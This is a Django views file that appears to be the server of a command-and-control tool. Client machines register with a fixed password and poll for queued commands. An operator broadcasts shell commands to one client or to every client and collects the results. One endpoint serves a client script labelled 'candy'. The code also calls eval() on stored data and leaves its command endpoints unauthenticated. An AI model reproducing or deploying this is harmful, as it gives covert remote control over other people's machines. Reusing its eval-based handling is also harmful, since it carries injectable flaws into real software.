from django.http import HttpResponse
from rest_framework import status
from django.template import loader
from rest_framework.decorators import api_view
from rest_framework.response import Response
from django.shortcuts import redirect
import random
from django.contrib.auth.models import User
from rest_framework.parsers import JSONParser
from .models import Messages, Command, Script, CommandResponse, UserData, Alert
from django.utils import timezone
from django.http import JsonResponse
import time


@api_view(['GET'])
def index(request):
    clients = UserData.objects.all()
    for i in clients:
        last = i.last_seen
        period = timezone.now() - last
        sec = period.seconds
        print(sec)
        if sec > 10:
            i.active = False
            i.save()
        else:
            i.active = True
            i.save()
    client = UserData.objects.filter(active=True)
    all_clients = []
    for i in client:
        uid_truncated = str(i.uid)[:10]
        uid_display = f'{uid_truncated}...'
        c = {'uid': i.uid, 'uid_display': uid_display, 'name': i.name, 'active': i.active}
        all_clients.append(c)

    client = UserData.objects.filter(active=False)
    for i in client:
        uid_truncated = str(i.uid)[:10]
        uid_display = f'{uid_truncated}...'
        c = {'uid': i.uid, 'uid_display': uid_display, 'name': i.name, 'active': i.active}
        all_clients.append(c)
    print(all_clients)
    page = 'index.html'
    template = loader.get_template(page)
    context = {'clients': all_clients}
    return HttpResponse(template.render(context, request), status=status.HTTP_200_OK)


@api_view(['GET'])
def terminal(request, uid):
    print(uid)
    request.session['clients_id'] = uid

    user = User.objects.get(username=uid)
    user_data = UserData.objects.get(user=user)

    # short cuts
    all_short_cuts = eval(user_data.short_cuts)
    all_short_cuts.reverse()

    last = user_data.last_seen
    period = timezone.now() - last
    sec = period.seconds
    print(sec)
    active = True
    if sec > 10:
        user_data.active = False
        user_data.save()
        active = False
    else:
        user_data.active = True
        user_data.save()

    name = user_data.name
    uid = user_data.uid

    uid_truncated = str(uid)[:10]
    uid_display = f'{uid_truncated}...'

    page = 'shell.html'
    template = loader.get_template(page)
    context = {'text': 'hello world', 'name': name, 'active': active, 'uid': uid, 'uid_display': uid_display,
               'shortcuts': all_short_cuts}
    return HttpResponse(template.render(context, request), status=status.HTTP_200_OK)


@api_view(['GET', 'POST'])
def commander(request):
    print('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    comm = request.POST.get('argss', '')
    target = str(request.session['clients_id'])
    data = {'command': comm, 'target': target}
    print(data)
    if target == 'active':
        user = User.objects.all()
        for i in user:
            mess = Command.objects.get(user=i)
            command = mess.command
            command = eval(command)
            command.append(data)
            command.reverse()
            mess.command = command
            mess.save()
        context = {'status': True, 'command': f'command sent to all clients'}
        print(context)
        return JsonResponse(context)
    else:
        user = User.objects.filter(username=target)
        print(user)
        if len(user) > 0:
            mess = Command.objects.get(user=user[0])
            command = mess.command
            command = eval(command)
            command.append(data)
            command.reverse()
            mess.command = command
            mess.save()
            context = {'status': 'success', 'response': f'command sent to user: {target}, awaiting response'}
            print(context)
            return JsonResponse(context)
        else:
            return JsonResponse({'status': 'failed', 'response': 'user does not exist'})


@api_view(['GET'])
def client_command_response(request):
    try:
        for i in range(10):
            time.sleep(2)
            user = 'helloworld'
            user = User.objects.get(username=user)
            mess = CommandResponse.objects.get(user=user)
            count = mess.command_count
            message = mess.command

            message = eval(message)

            if int(count) < int(len(message)):
                message.reverse()
                new_message = message[0]
                print(new_message)
                response = new_message['response']
                command_executed = new_message['command']
                uid = new_message['client']
                mess.command_count = len(message)
                mess.save()
                print(message)
                context = {'new': True, 'response': response, 'command': command_executed,
                           'uid': uid, 'sender': str(user)}
                return JsonResponse(context)

        context = {'new': False, 'response': 'No response from client Found'}
        return JsonResponse(context)

    except Exception as e:
        context = {'response': e}
        return JsonResponse(context)


@api_view(['POST'])
def short_cuts(request):
    button = str(request.POST.get('action', ''))
    print(button)
    uid = request.session['clients_id']
    print(uid)
    user = User.objects.get(username=uid)
    client = UserData.objects.get(user=user)
    all_short_cuts = eval(client.short_cuts)
    print(all_short_cuts)
    new_short_cut = {'button_name': button, 'button_value': button}
    print(new_short_cut)
    all_short_cuts.append(new_short_cut)
    client.short_cuts = all_short_cuts
    client.save()
    return redirect(terminal, uid)


@api_view(['GET'])
def get_resp(request):
    print('sending....')
    for i in range(10):
        time.sleep(1)
    return JsonResponse({'success': True, 'message': 'This is a message'})


@api_view(['GET', 'POST'])
def login(request):
    try:
        data = JSONParser().parse(request)
        print(data)
        name = data['name']
        uid = str(data['uid'])
        user = User.objects.filter(username=uid)
        print(user)

        if len(user) == 1:
            print('user exists')
            userdata = UserData.objects.get(user=user[0])
            print(userdata)

            alert = {'uid': uid, 'name': name, 'time': str(timezone.now())}

            user = 'helloworld'
            user = User.objects.get(username=user)

            alerter = Alert.objects.get(user=user)
            all_alerts = alerter.alert
            all_alerts = eval(all_alerts)
            all_alerts.append(alert)
            alerter.alert = all_alerts
            alerter.save()
            print('alert saved')

            context = {'user': str(userdata)}
            print(context)
            return Response(context, status=status.HTTP_200_OK)
        else:
            print('registering...1')
            pwd1 = '1111'
            name = data['name']
            print(name)
            print(uid)
            info = User.objects.create_user(username=uid, password=pwd1)
            info.save()
            print('registering...2')
            x = User.objects.values()
            print(x)
            sn = len(x) + 1000
            print(sn)
            user = User.objects.get(username=uid)
            print(uid)
            ud = UserData(user=user, serial_num=f'{name}-{sn}', name=name)
            new = Messages(user=user)
            cm = Command(user=user)
            sc = Script(user=user)
            cr = CommandResponse(user=user)
            ud.save()
            new.save()
            cm.save()
            sc.save()
            cr.save()
            print('saved')



            alert = {'uid': uid, 'name': name, 'time': str(timezone.now())}

            user = 'helloworld'
            user = User.objects.get(username=user)

            alerter = Alert.objects.get(user=user)
            all_alerts = alerter.alert
            all_alerts = eval(all_alerts)
            all_alerts.append(alert)
            alerter.alert = all_alerts
            alerter.save()
            print('alert saved')

            userdata = UserData.objects.get(user=user)
            context = {'user': str(userdata)}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        print(e)
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def notifier(request):
    try:
        user = 'helloworld'
        user = User.objects.get(username=user)

        alerter = Alert.objects.get(user=user)
        all_alerts = alerter.alert
        alert_count = alerter.alert_count
        all_alerts = eval(all_alerts)

        if int(len(all_alerts)) == int(alert_count):
            print('no alerts')
            return JsonResponse({'new': 0})
        else:
            print('new alert')
            all_alerts.reverse()
            client = all_alerts[0]
            alerter.alert_count = len(all_alerts)
            alerter.save()
            name = client['name']
            uid = client['uid']
            time = client['time']
            return JsonResponse({'new': 1, 'name': name, 'uid': uid, 'time': time})

    except Exception as e:
        print(e)
        return JsonResponse({'new': 0})




@api_view(['GET', 'POST'])
def script(request):
    try:
        py_file = open('remote/anonunit.py', 'r')
        data = py_file.read()
        py_file.close()
        context = {'new': True, 'candy': str(data)}
        return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def get_clients(request):
    try:
        clients = UserData.objects.all()
        all_clients = []
        for i in clients:
            last = i.last_seen
            period = timezone.now() - last
            sec = period.seconds
            days = period.days
            print(sec)
            if sec > 10:
                i.active = False
                i.save()
            else:
                i.active = True
                i.save()
            client = {'uid': str(i.user), 'name': i.name, 'last_seen': i.last_seen, 'active': i.active,
                      'serial_num': i.serial_num}
            all_clients.append(client)
        print(all_clients)
        context = {'clients': all_clients}
        return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        print(e)
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def ping(request):
    try:
        data = JSONParser().parse(request)
        print(data)
        user = data['uid']
        user = User.objects.get(username=user)
        userdata = UserData.objects.get(user=user)
        userdata.last_seen = timezone.now()
        userdata.save()
        context = {}
        return Response(context, status=status.HTTP_200_OK)
    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def get_uid(request):
    try:
        data = JSONParser().parse(request)
        print(data)
        user = data['target']
        userdata = UserData.objects.filter(serial_num=user)
        if len(userdata) == 1:
            userdata = userdata[0]
            uid = userdata.user
            print(uid)
            context = {'uid': str(uid)}
            return Response(context, status=status.HTTP_200_OK)
        else:
            context = {'uid': 0}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def sender(request):
    try:
        if request.method == 'GET':

            """user = 'helloworld001'
            user = User.objects.get(username=user)
            c = CommandResponse(user=user)
            c.save()"""
            context = {'mode': 'SANDBOX'}

            return Response(context, status=status.HTTP_200_OK)

        elif request.method == 'POST':
            data = JSONParser().parse(request)
            user = data['uid']
            user = User.objects.get(username=user)
            mess = Messages.objects.get(user=user)
            message = mess.message

            message = eval(message)
            message.append(data)
            print(message)

            mess.message = message

            mess.save()
            context = {'mode': 'SANDBOX', 'message': f'message sent to {user}'}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
def send_command(request):
    print('herlllllllll')
    try:
        data = JSONParser().parse(request)
        print(data)
        # target = data['target']
        target = request.session['user']
        if target == 'active':
            user = User.objects.all()
            for i in user:
                mess = Command.objects.get(user=i)
                command = mess.command
                command = eval(command)
                command.append(data)
                command.reverse()
                mess.command = command
                mess.save()
            context = {'mode': 'SANDBOX', 'command': f'command sent to all clients'}
            return Response(context, status=status.HTTP_200_OK)
        else:
            user = User.objects.filter(username=target)
            print(user)
            if len(user) > 0:
                mess = Command.objects.get(user=user[0])
                command = mess.command
                command = eval(command)
                command.append(data)
                command.reverse()
                mess.command = command
                mess.save()
                context = {'mode': 'SANDBOX', 'command': f'command sent to user: {target}'}
                print(context)
                return Response(context, status=status.HTTP_200_OK)
            else:
                context = {'mode': 'SANDBOX', 'command': f'user: {target} not found'}
                return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        print(context)
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def read_command(request):
    try:
        data = JSONParser().parse(request)
        user = data['uid']
        user = User.objects.get(username=user)
        mess = Command.objects.get(user=user)
        count = mess.command_count
        command = mess.command

        command = eval(command)
        print(len(command))
        print(int(count))

        if int(count) < int(len(command)):
            diff = int(len(command) - count)
            print(diff)
            new_commands = command[0:diff]
            mess.command_count = len(command)
            mess.save()
            context = {'new': True, 'command': new_commands, 'sender': str(user)}
            return Response(context, status=status.HTTP_200_OK)
        else:
            context = {'new': False, 'command': ''}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        print(context)
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def command_feedback(request):
    try:
        if request.method == 'GET':
            context = {'mode': 'SANDBOX'}
            return Response(context, status=status.HTTP_200_OK)

        elif request.method == 'POST':
            data = JSONParser().parse(request)

            user = 'helloworld'
            user = User.objects.get(username=user)
            mess = CommandResponse.objects.get(user=user)
            command = mess.command
            print(data)

            command = eval(command)
            command.append(data)
            mess.command = command
            mess.save()

            context = {'mode': 'SANDBOX', 'response': f'response sent to {user}'}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        print(context)
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def command_response(request):
    try:
        user = 'helloworld'
        user = User.objects.get(username=user)
        mess = CommandResponse.objects.get(user=user)
        count = mess.command_count
        command = mess.command

        command = eval(command)
        print(len(command))
        print(int(count))

        if int(count) < int(len(command)):
            diff = int(len(command) - count)
            print(diff)
            new_commands = command[0:diff]

            mess.command_count = len(command)
            mess.save()
            context = {'new': True, 'response': new_commands, 'sender': str(user)}
            return Response(context, status=status.HTTP_200_OK)

        else:
            context = {'new': False, 'response': ''}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET', 'POST'])
def reader(request):
    try:
        user = 'helloworld002'
        user = User.objects.get(username=user)
        mess = Messages.objects.get(user=user)
        count = mess.message_count
        message = mess.message

        message = eval(message)
        print(len(message))
        print(int(count))

        if int(count) < int(len(message)):
            new_message = message[int(len(message) - 1)]
            mess.message_count = len(message)
            mess.save()
            print(message)
            context = {'new': True, 'message': new_message, 'sender': str(user)}
            return Response(context, status=status.HTTP_200_OK)
        else:
            context = {'new': False, 'message': ''}
            return Response(context, status=status.HTTP_200_OK)

    except Exception as e:
        context = {'error_message': e}
        return Response(context, status=status.HTTP_400_BAD_REQUEST)